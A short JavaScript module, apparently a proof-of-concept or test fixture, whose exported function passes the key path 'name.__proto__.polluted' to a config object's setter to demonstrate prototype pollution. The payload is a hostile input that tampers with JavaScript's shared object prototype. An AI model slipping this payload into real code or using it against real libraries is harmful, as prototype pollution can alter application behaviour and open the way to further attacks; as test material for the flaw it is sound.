function exploitFunction(config) {
    let obj = {};
    config.set("name.__proto__.polluted", "yes");
    return obj;
}

module.exports = { exploitFunction };